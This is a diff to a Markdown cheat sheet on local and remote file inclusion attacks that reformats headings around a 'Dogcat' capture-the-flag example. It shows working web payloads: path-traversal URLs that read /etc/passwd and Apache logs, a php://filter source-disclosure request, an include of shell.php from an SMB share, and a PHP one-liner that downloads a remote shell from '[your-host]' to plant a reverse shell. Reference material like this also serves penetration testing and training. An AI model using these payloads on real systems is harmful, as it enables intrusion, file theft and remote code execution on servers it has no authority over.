@@ -21,7 +21,7 @@
   * [Wrapper expect://](#wrapper-expect)
   * [Wrapper input://](#wrapper-input)
   * [Wrapper phar://](#wrapper-phar)
-* LFI CTF Dogcat(#CTF_one)
+* [LFI CTF Dogcat(#CTF_one)](#LFI-CTF-THM-Dogcat-example)
 * [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
 * [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
 * [LFI to RCE via upload](#lfi-to-rce-via-upload)
@@ -114,15 +114,16 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 2. Write a PHP code inside a file : `shell.php`
 3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 
-### LFI CTF THM Dogcat example
+## LFI CTF THM Dogcat example
 ```powershell
 http://example.com/?view=php://filter/convert.base64-encode/cat/resource=index
 http://example.com/?view=../../../../etc/cat../passwd/&ext=
 http://example.com/?view=../../../../var/log/apache2/cat/../access.log&ext=
 ```
-# Uploading a reverse shell using get request
+### Uploading a reverse shell using get request
+```powershell
 <?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php')
-
+```
 ## LFI / RFI using wrappers
 
 ### Wrapper php://filter
